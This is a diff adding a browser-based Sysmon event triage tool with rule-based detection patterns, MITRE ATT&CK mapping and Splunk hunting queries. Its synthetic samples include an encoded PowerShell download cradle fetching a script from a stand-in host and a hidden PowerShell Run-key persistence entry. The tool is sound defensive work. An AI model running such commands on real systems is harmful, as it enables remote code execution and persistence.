@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Sysmon Event Analyzer</title>
+<style>
+:root{box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+--bg:#f3f5f7;--sf:#fff;--tx:#1b2430;--mu:#5a6676;--bd:#d9dfe6;--ac:#0f6b78;--cd:#eef2f5;
+--hi:#b42318;--hib:#fde8e6;--me:#8a4b08;--meb:#fdf0d5;--lo:#1d5fa8;--lob:#e3eefb;--ok:#146c43;--okb:#dcf5e7}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+@media(prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0f1419;--sf:#171e26;--tx:#e6ebf0;--mu:#94a1b0;--bd:#2a3441;--ac:#4cc3d1;--cd:#0c1117;
+--hi:#ff9b90;--hib:#3b1a17;--me:#f4b860;--meb:#37270d;--lo:#8ab8f2;--lob:#15263d;--ok:#6fdca4;--okb:#0f2e20}}
+:root[data-theme="dark"]{--bg:#0f1419;--sf:#171e26;--tx:#e6ebf0;--mu:#94a1b0;--bd:#2a3441;--ac:#4cc3d1;--cd:#0c1117;
+--hi:#ff9b90;--hib:#3b1a17;--me:#f4b860;--meb:#37270d;--lo:#8ab8f2;--lob:#15263d;--ok:#6fdca4;--okb:#0f2e20}
+*{box-sizing:border-box;margin:0}
+body{background:var(--bg);color:var(--tx);font:15px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+.wrap{max-width:1060px;margin:0 auto;padding:22px 16px 44px}
+header{display:flex;gap:16px;justify-content:space-between;align-items:flex-start;margin-bottom:16px}
+h1{font-size:25px;line-height:1.2;letter-spacing:-.01em}
+.mu{color:var(--mu)}header p{max-width:62ch;margin-top:6px}
+button{font:inherit;cursor:pointer}
+.btn{background:var(--sf);color:var(--tx);border:1px solid var(--bd);border-radius:8px;padding:7px 12px}
+.btn:hover{border-color:var(--ac)}
+.btn.pri{background:var(--ac);border-color:var(--ac);color:var(--bg);font-weight:600}
+:focus-visible{outline:2px solid var(--ac);outline-offset:2px}
+.note{background:var(--sf);border:1px solid var(--bd);border-radius:10px;padding:10px 14px;margin-bottom:16px;font-size:13.5px;color:var(--mu)}
+.grid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.25fr);gap:18px;align-items:start}
+@media(max-width:780px){.grid{grid-template-columns:1fr}}
+.panel{background:var(--sf);border:1px solid var(--bd);border-radius:12px;padding:14px}
+label{font-weight:600;display:block;margin-bottom:6px}
+textarea{width:100%;min-height:250px;resize:vertical;background:var(--cd);color:var(--tx);border:1px solid var(--bd);border-radius:8px;padding:10px;font:12.5px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.row{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
+.chips{margin-top:14px}.chips p{font-size:13px;margin-bottom:6px}
+.chip{background:var(--cd);border:1px solid var(--bd);border-radius:999px;padding:4px 11px;font-size:13px;color:var(--tx)}
+.chip:hover{border-color:var(--ac)}
+.sum{border-radius:10px;padding:11px 14px;margin-bottom:12px;font-weight:600}
+.sum small{display:block;font-weight:400;margin-top:2px}
+.s-hi{background:var(--hib);color:var(--hi)}.s-me{background:var(--meb);color:var(--me)}.s-lo{background:var(--lob);color:var(--lo)}.s-ok{background:var(--okb);color:var(--ok)}
+.f{border:1px solid var(--bd);border-left:5px solid var(--bd);border-radius:10px;padding:12px 14px;margin-bottom:10px;background:var(--sf)}
+.f.hi{border-left-color:var(--hi)}.f.me{border-left-color:var(--me)}.f.lo{border-left-color:var(--lo)}
+.f h3{font-size:15.5px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.tag{font-size:12px;font-weight:600;padding:1px 8px;border-radius:999px}
+.tag.hi{background:var(--hib);color:var(--hi)}.tag.me{background:var(--meb);color:var(--me)}.tag.lo{background:var(--lob);color:var(--lo)}
+.f p{margin-top:6px;font-size:14px}
+a{color:var(--ac)}
+pre{background:var(--cd);border:1px solid var(--bd);border-radius:8px;padding:9px 10px;margin-top:8px;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;white-space:pre-wrap;word-break:break-word}
+.cap{font-size:12.5px;color:var(--mu);margin-top:9px}
+.qr{display:flex;gap:8px;align-items:flex-start}.qr pre{flex:1;margin-top:4px}.qr .btn{margin-top:4px;padding:5px 10px;font-size:13px}
+details{margin-top:10px}summary{cursor:pointer;font-weight:600}
+table{border-collapse:collapse;width:100%;margin-top:8px;font-size:13px}
+td{padding:5px 8px;border-top:1px solid var(--bd);vertical-align:top;word-break:break-word}td:first-child{color:var(--mu);width:34%}
+.empty{padding:26px 8px;text-align:center;color:var(--mu)}
+footer{margin-top:22px;font-size:13px;color:var(--mu)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+ <div>
+  <h1>Sysmon Event Analyzer</h1>
+  <p class="mu">Paste a Sysmon or Windows event and get a plain-English triage, the matching MITRE ATT&amp;CK technique, and a Splunk query to pivot on. Companion to the Splunk Threat Hunting Lab.</p>
+ </div>
+ <button class="btn" id="th" type="button">Switch theme</button>
+</header>
+<div class="note">Rule-based triage aid. It runs entirely in your browser and sends nothing anywhere. Sample events are synthetic. Covers Sysmon Event IDs 1 (process creation), 3 (network connection), 13 (registry value set), and the Windows log-cleared events 1102 and 104.</div>
+<div class="grid">
+ <section class="panel">
+  <label for="in">Event text</label>
+  <textarea id="in" spellcheck="false" placeholder="Paste Event Viewer text (Key: Value), JSON, or Splunk key=&quot;value&quot; pairs"></textarea>
+  <div class="row"><button class="btn pri" id="go" type="button">Analyze event</button><button class="btn" id="clr" type="button">Clear</button></div>
+  <div class="chips"><p class="mu">Load a synthetic sample:</p><div class="row" style="margin-top:0" id="samples"></div></div>
+ </section>
+ <section id="out" aria-live="polite"><div class="panel empty">Paste an event or load a sample, then choose Analyze event.</div></section>
+</div>
+<footer>Limits: pattern matching, not a verdict. A match is a lead to verify with parent processes, user context, and timing. No match does not mean an event is safe. Thresholds and patterns are starting points to tune against your own baseline.</footer>
+</div>
+<script>
+const $=id=>document.getElementById(id);
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const base=p=>(p||'').split(/[\\/]/).pop().toLowerCase();
+const isPriv=ip=>/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.)/.test(ip||'');
+function enc(s){let b='';for(const c of s){const x=c.charCodeAt(0);b+=String.fromCharCode(x&255,x>>8)}return btoa(b)}
+function dec(b){try{const bin=atob(b),u=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return new TextDecoder('utf-16le').decode(u)}catch(e){return null}}
+
+function parse(t){
+ t=t.trim();const o={};
+ const put=(k,v)=>{k=String(k).toLowerCase().replace(/[^a-z0-9]/g,'');if(v!=null&&String(v).trim()!=='')o[k]=String(v).trim()};
+ const fin=()=>{o.eventcode=o.eventcode||o.eventid;o.host=o.host||o.computer||o.computername||o.hostname;return o};
+ if(t[0]==='{'){try{(function w(x){for(const k in x){const v=x[k];if(v&&typeof v==='object')w(v);else put(k,v)}})(JSON.parse(t));return fin()}catch(e){}}
+ let n=0;
+ for(const l of t.split(/\r?\n/)){const m=l.match(/^\s*([A-Za-z][\w ]{1,30}?)\s*[:=]\s*(.+)$/);if(m){put(m[1],m[2].replace(/^"(.*)"$/,'$1'));n++}}
+ if(n<2){const re=/([A-Za-z]\w*)=("[^"]*"|\S+)/g;let m;while((m=re.exec(t)))put(m[1],m[2].replace(/^"(.*)"$/,'$1'))}
+ return fin();
+}
+
+const OFFICE=['winword.exe','excel.exe','powerpnt.exe','outlook.exe','onenote.exe','msaccess.exe'];
+const SHELLS=['powershell.exe','pwsh.exe','cmd.exe','wscript.exe','cscript.exe','mshta.exe','rundll32.exe','regsvr32.exe'];
+const BADPORT={4444:'the default Metasploit listener port',1337:'a port commonly used in hacker tooling',31337:'a classic backdoor port',5555:'a port often used by reverse shells and Android debug bridge',9001:'a port commonly used by Tor relays'};
+const LB=[
+ [/certutil/i,/(urlcache|-decode|-f\s+http)/i,'me','Certutil used to download or decode a file','certutil is a signed Windows tool often abused to fetch payloads, a “living off the land” technique.','T1105','index=wineventlog EventCode=1 Image="*certutil.exe" CommandLine="*urlcache*"'],
+ [/bitsadmin/i,/(\/transfer|download)/i,'me','BITS job used to transfer a file','bitsadmin can download files in the background using a trusted Windows service.','T1197','index=wineventlog EventCode=1 Image="*bitsadmin.exe" CommandLine="*transfer*"'],
+ [/mshta/i,/(http|vbscript|javascript)/i,'hi','mshta running remote or script content','mshta executes HTML applications and is a common way to run attacker script through a signed binary.','T1218.005','index=wineventlog EventCode=1 Image="*mshta.exe" (CommandLine="*http*" OR CommandLine="*vbscript*")'],
+ [/regsvr32/i,/(scrobj|\/i:)/i,'hi','regsvr32 loading a script or remote file','The “Squiblydoo” pattern abuses regsvr32 to run script content without writing a typical payload.','T1218.010','index=wineventlog EventCode=1 Image="*regsvr32.exe" (CommandLine="*scrobj*" OR CommandLine="*/i:*")'],
+ [/rundll32/i,/(javascript:|mshtml)/i,'hi','rundll32 running script content','rundll32 should load DLL functions. Script or mshtml arguments are a known evasion pattern.','T1218.011','index=wineventlog EventCode=1 Image="*rundll32.exe" (CommandLine="*javascript:*" OR CommandLine="*mshtml*")'],
+ [/wmic/i,/(process\s+call\s+create|\/node:)/i,'me','WMIC creating a process or targeting a remote node','WMI can start processes locally or on other machines and is used for execution and lateral movement.','T1047','index=wineventlog EventCode=1 Image="*wmic.exe" CommandLine="*process call create*"'],
+ [/schtasks/i,/\/create/i,'me','Scheduled task created from the command line','New scheduled tasks are a common persistence mechanism that survives reboots.','T1053.005','index=wineventlog EventCode=1 Image="*schtasks.exe" CommandLine="*/create*"'],
+ [/wevtutil/i,/(\scl\s|clear-log)/i,'hi','Event logs cleared with wevtutil','Clearing logs removes evidence of earlier activity. Outside a documented maintenance window this needs investigation.','T1070.001','index=wineventlog EventCode=1 Image="*wevtutil.exe" (CommandLine="* cl *" OR CommandLine="*clear-log*")'],
+ [/(vssadmin|wmic|bcdedit)/i,/(delete\s+shadows|shadowcopy\s+delete|recoveryenabled\s+no)/i,'hi','Backups or recovery options being destroyed','Deleting shadow copies or disabling recovery is a standard step before ransomware encryption.','T1490','index=wineventlog EventCode=1 (CommandLine="*delete shadows*" OR CommandLine="*shadowcopy delete*" OR CommandLine="*recoveryenabled no*")'],
+ [/\bnet1?(\.exe)?\b/i,/(\suser\s.+\/add|localgroup\s+administrators\s.+\/add)/i,'hi','Local account created or added to Administrators','Creating accounts or elevating them to administrator is a common persistence and privilege step.','T1136.001','index=wineventlog EventCode=1 (Image="*net.exe" OR Image="*net1.exe") CommandLine="*/add*"'],
+ [/\breg(\.exe)?\b/i,/add\s.+\\(run|runonce)\b/i,'me','Run key added through reg.exe','Adding a Run key makes a program start at every logon.','T1547.001','index=wineventlog EventCode=1 Image="*reg.exe" CommandLine="*CurrentVersion\\\\Run*"'],
+ [/./,/\b(whoami|systeminfo|nltest|net1?\s+(view|group|localgroup))\b/i,'lo','Host or domain discovery command','Often normal admin work, but attackers run these soon after getting access to learn the environment.','T1033','index=wineventlog EventCode=1 (CommandLine="*whoami*" OR CommandLine="*systeminfo*" OR CommandLine="*nltest*")']
+];
+const techUrl=t=>'https://attack.mitre.org/techniques/'+t.replace('.','/')+'/';
+
+function analyze(f){
+ const out=[],E=(f.eventcode||'').toString();
+ let eid=parseInt(E);
+ if(isNaN(eid))eid=f.targetobject?13:f.destinationip?3:(f.commandline||f.image)?1:0;
+ const F=(sev,title,why,tech,q,ev,extra)=>out.push({sev,title,why,tech,q,ev,extra});
+ const img=base(f.image),par=base(f.parentimage),cmd=f.commandline||'';
+ if(eid===1){
+  const isPS=['powershell.exe','pwsh.exe'].includes(img)||/^\W*(powershell|pwsh)/i.test(cmd);
+  if(isPS){
+   const m=cmd.match(/-(?:e|ec|en|enc|encodedcommand)\s+([A-Za-z0-9+\/=]{16,})/i);
+   if(m){const d=dec(m[1]);const bad=d&&/(iex|invoke-expression|downloadstring|downloadfile|webclient|invoke-webrequest|frombase64|bypass|hidden)/i.test(d);
+    F(bad?'hi':'me','Base64-encoded PowerShell command',bad?'The decoded script contains download or execution behavior. Encoding hides the real command from simple string searches.':'Encoded commands hide intent from simple string searches. Review the decoded script below.','T1059.001','index=wineventlog EventCode=1 Image="*powershell.exe" (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*")',m[1].slice(0,60)+(m[1].length>60?'…':''),d?{lbl:'Decoded payload (UTF-16LE Base64)',txt:d}:{lbl:'Decoding',txt:'Could not decode the value as UTF-16LE Base64.'})}
+   if(/-w(?:indowstyle)?\s+hidden/i.test(cmd))F('me','PowerShell launched with a hidden window','A hidden window keeps the user from seeing the script run.','T1059.001','index=wineventlog EventCode=1 Image="*powershell.exe" (CommandLine="*-w hidden*" OR CommandLine="*-WindowStyle Hidden*")','hidden window flag');
+   if(/-(?:ep|executionpolicy)\s+bypass/i.test(cmd))F('me','Execution policy bypass','Bypassing execution policy lets unsigned scripts run. Admins sometimes do this too, so check the parent.','T1059.001','index=wineventlog EventCode=1 Image="*powershell.exe" CommandLine="*bypass*"','execution policy bypass');
+   if(/(\biex\b|invoke-expression|downloadstring|downloadfile|net\.webclient|invoke-webrequest|\biwr\b)/i.test(cmd))F('hi','PowerShell download or in-memory execution','The command line fetches content or evaluates a string as code, which is typical of download cradles.','T1059.001','index=wineventlog EventCode=1 Image="*powershell.exe" (CommandLine="*DownloadString*" OR CommandLine="*Invoke-Expression*" OR CommandLine="*IEX*")','download or eval keyword');
+   if(/-nop\b|-noprofile/i.test(cmd))F('lo','PowerShell started without a profile','Skipping the profile is common in attacker one-liners, but also in automation. Weak signal alone.','T1059.001','index=wineventlog EventCode=1 Image="*powershell.exe" CommandLine="*-nop*"','-nop flag');
+  }
+  if(OFFICE.includes(par)&&SHELLS.includes(img))F('hi','Office application spawned a shell or script host','Documents rarely need to start shells. This parent-child pair is a classic sign of a malicious macro or document exploit.','T1204.002','index=wineventlog EventCode=1 (ParentImage="*winword.exe" OR ParentImage="*excel.exe" OR ParentImage="*outlook.exe") (Image="*powershell.exe" OR Image="*cmd.exe")',f.parentimage+' → '+f.image);
+  else if(par==='wmiprvse.exe'&&SHELLS.includes(img))F('me','Shell started by WMI','Processes spawned by wmiprvse.exe often indicate remote execution through WMI.','T1047','index=wineventlog EventCode=1 ParentImage="*wmiprvse.exe"',f.parentimage+' → '+f.image);
+  const hay=(f.image||'')+' '+cmd;
+  for(const r of LB)if(r[0].test(hay)&&r[1].test(cmd))F(r[2],r[3],r[4],r[5],r[6],cmd.slice(0,140));
+  if(/\\(temp|appdata|downloads|public|programdata)\\/i.test(f.image||''))F('me','Process running from a user-writable folder','Legitimate software rarely runs from Temp, AppData, Downloads, or Public. This is context rather than a technique on its own.','','index=wineventlog EventCode=1 (Image="*\\\\Temp\\\\*" OR Image="*\\\\AppData\\\\*" OR Image="*\\\\Users\\\\Public\\\\*")',f.image);
+ }
+ if(eid===3){
+  const ip=f.destinationip||'',port=parseInt(f.destinationport),priv=isPriv(ip);
+  if(BADPORT[port])F(!priv&&port===4444?'hi':'me','Connection to port '+port,'Port '+port+' is '+BADPORT[port]+'.','T1571','index=wineventlog EventCode=3 DestinationPort='+port+' | stats count by host, Image, DestinationIp',ip+':'+port);
+  if(ip&&!priv&&SHELLS.concat(['certutil.exe','bitsadmin.exe']).includes(img))F('me','Scripting or download tool made an outbound connection',img+' does not normally talk to the internet. Check what it fetched and why.','T1071.001','index=wineventlog EventCode=3 (Image="*powershell.exe" OR Image="*mshta.exe" OR Image="*wscript.exe") | stats count by host, Image, DestinationIp',f.image+' to '+ip);
+  if(ip&&priv&&[445,3389,5985,5986].includes(port))F(SHELLS.includes(img)?'me':'lo','Internal connection on an admin port ('+port+')','SMB, RDP, and WinRM are normal for IT tooling but are also how attackers move between hosts. Look at which process opened the connection.','T1021','index=wineventlog EventCode=3 DestinationPort='+port+' | stats dc(DestinationIp) as targets by host, Image',f.image+' to '+ip+':'+port);
+ }
+ if(eid===13){
+  const t=f.targetobject||'',d=f.details||'';
+  if(/\\CurrentVersion\\Run(Once)?(\\|$)/i.test(t)){const bad=/(powershell|cmd\.exe|wscript|mshta|\\temp\\|\\appdata\\|\\public\\|http)/i.test(d);
+   F(bad?'hi':'me','Run key value set (persistence)',bad?'The value launches a script host or a program from a user-writable path, which is a strong persistence signal.':'Run keys start programs at logon. Verify the program is expected software.','T1547.001','index=wineventlog EventCode=13 TargetObject="*CurrentVersion\\\\Run*" | table _time, host, Image, TargetObject, Details',t.split('\\').slice(-2).join('\\')+' = '+d)}
+  if(/Image File Execution Options/i.test(t))F('hi','Image File Execution Options modified','Debugger entries here can hijack a program or hide a backdoor behind a trusted name.','T1546.012','index=wineventlog EventCode=13 TargetObject="*Image File Execution Options*"',t);
+  if(/\\Winlogon\\(Shell|Userinit)/i.test(t))F('hi','Winlogon Shell or Userinit modified','These values control what runs at logon. Unexpected changes are a known persistence method.','T1547.004','index=wineventlog EventCode=13 (TargetObject="*Winlogon*Shell*" OR TargetObject="*Winlogon*Userinit*")',t+' = '+d);
+ }
+ if(eid===1102||eid===104)F('hi','Windows event log was cleared','Clearing a log removes evidence. Outside a maintenance window, treat it as possible log tampering.','T1070.001','index=wineventlog (EventCode=1102 OR EventCode=104) | table _time, host, EventCode, Message','Event ID '+eid);
+ return {out,eid};
+}
+
+const ORD={hi:3,me:2,lo:1},NAME={hi:'High',me:'Medium',lo:'Low'};
+let QS=[];
+function render(f,r){
+ QS=[];const o=r.out;
+ const top=o.reduce((a,x)=>Math.max(a,ORD[x.sev]),0);
+ const c=k=>o.filter(x=>x.sev===k).length;
+ let h='';
+ if(!o.length){h+='<div class="sum s-ok">No built-in rule matched<small>This does not mean the event is safe. Review the fields and pivots below.</small></div>'}
+ else{const k=top===3?'hi':top===2?'me':'lo';
+  h+='<div class="sum s-'+k+'">'+o.length+' finding'+(o.length>1?'s':'')+', highest severity: '+NAME[k]+'<small>'+c('hi')+' high, '+c('me')+' medium, '+c('lo')+' low</small></div>'}
+ o.sort((a,b)=>ORD[b.sev]-ORD[a.sev]).forEach(x=>{
+  QS.push(x.q);
+  h+='<article class="f '+x.sev+'"><h3><span class="tag '+x.sev+'">'+NAME[x.sev]+'</span>'+esc(x.title)+'</h3><p>'+esc(x.why)+'</p>'
+   +(x.ev?'<div class="cap">Matched on: <code>'+esc(x.ev)+'</code></div>':'')
+   +(x.extra?'<div class="cap">'+esc(x.extra.lbl)+'</div><pre>'+esc(x.extra.txt)+'</pre>':'')
+   +(x.tech?'<div class="cap">MITRE ATT&amp;CK: <a href="'+techUrl(x.tech)+'" target="_blank" rel="noopener">'+x.tech+'</a></div>':'')
+   +'<div class="cap">Hunt in Splunk (confirm index and field names for your environment):</div><div class="qr"><pre>'+esc(x.q)+'</pre><button class="btn cp" type="button" data-i="'+(QS.length-1)+'">Copy query</button></div></article>'});
+ const pv=[];
+ if(f.host)pv.push(['Everything this host did, in order','index=wineventlog host="'+f.host+'" | table _time, EventCode, ParentImage, Image, CommandLine | sort _time']);
+ if(f.image)pv.push(['Every time this program ran','index=wineventlog EventCode=1 Image="'+f.image.replace(/\\/g,'\\\\')+'" | stats count by host, User, ParentImage']);
+ if(f.destinationip)pv.push(['Who else talked to this IP','index=wineventlog EventCode=3 DestinationIp="'+f.destinationip+'" | stats count by host, Image, DestinationPort']);
+ if(pv.length){h+='<details open><summary>Suggested pivots</summary>';pv.forEach(p=>{QS.push(p[1]);h+='<div class="cap">'+esc(p[0])+'</div><div class="qr"><pre>'+esc(p[1])+'</pre><button class="btn cp" type="button" data-i="'+(QS.length-1)+'">Copy query</button></div>'});h+='</details>'}
+ const keys=Object.keys(f);
+ h+='<details><summary>Parsed fields ('+keys.length+')</summary><table>'+keys.map(k=>'<tr><td>'+esc(k)+'</td><td>'+esc(f[k])+'</td></tr>').join('')+'</table></details>';
+ $('out').innerHTML='<div class="panel">'+h+'</div>';
+}
+function run(){
+ const t=$('in').value;
+ if(!t.trim()){$('out').innerHTML='<div class="panel empty">Nothing to analyze yet. Paste an event or load a sample.</div>';return}
+ const f=parse(t);
+ if(!Object.keys(f).length){$('out').innerHTML='<div class="panel empty">No fields found. Use lines like Image: C:\\path\\app.exe, JSON, or key="value" pairs.</div>';return}
+ render(f,analyze(f));
+}
+const S=String.raw;
+const SAMPLES=[
+ ['Word spawns encoded PowerShell',()=>S`EventCode: 1
+Computer: WS-DEMO-01
+User: DEMO\analyst
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+CommandLine: powershell.exe -nop -w hidden -enc ${enc("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/stage.ps1')")}`],
+ ['Connection to port 4444',()=>S`EventCode: 3
+Computer: WS-DEMO-02
+Image: C:\Users\demo\AppData\Local\Temp\update.exe
+SourceIp: 10.0.0.15
+DestinationIp: 203.0.113.50
+DestinationPort: 4444`],
+ ['Run key persistence',()=>S`EventCode: 13
+Computer: WS-DEMO-03
+Image: C:\Windows\System32\reg.exe
+TargetObject: HKU\S-1-5-21-DEMO\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+Details: powershell.exe -w hidden -file C:\Users\Public\x.ps1`],
+ ['Ordinary browser activity',()=>S`EventCode: 1
+Computer: WS-DEMO-04
+Image: C:\Program Files\Google\Chrome\Application\chrome.exe
+ParentImage: C:\Windows\explorer.exe
+CommandLine: "C:\Program Files\Google\Chrome\Application\chrome.exe"`]
+];
+SAMPLES.forEach((s,i)=>{const b=document.createElement('button');b.type='button';b.className='chip';b.textContent=s[0];b.onclick=()=>{$('in').value=s[1]();run()};$('samples').appendChild(b)});
+$('go').onclick=run;
+$('clr').onclick=()=>{$('in').value='';$('out').innerHTML='<div class="panel empty">Paste an event or load a sample, then choose Analyze event.</div>'};
+$('out').addEventListener('click',e=>{const b=e.target.closest('.cp');if(!b)return;const t=QS[+b.dataset.i];
+ const done=()=>{b.textContent='Copied';setTimeout(()=>b.textContent='Copy query',1400)};
+ const fb=()=>{const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();try{document.execCommand('copy');done()}catch(x){}a.remove()};
+ if(navigator.clipboard)navigator.clipboard.writeText(t).then(done,fb);else fb()});
+$('th').onclick=()=>{const r=document.documentElement;const dark=r.getAttribute('data-theme')?r.getAttribute('data-theme')==='dark':matchMedia('(prefers-color-scheme: dark)').matches;r.setAttribute('data-theme',dark?'light':'dark')};
+</script>
+</body>
+</html>
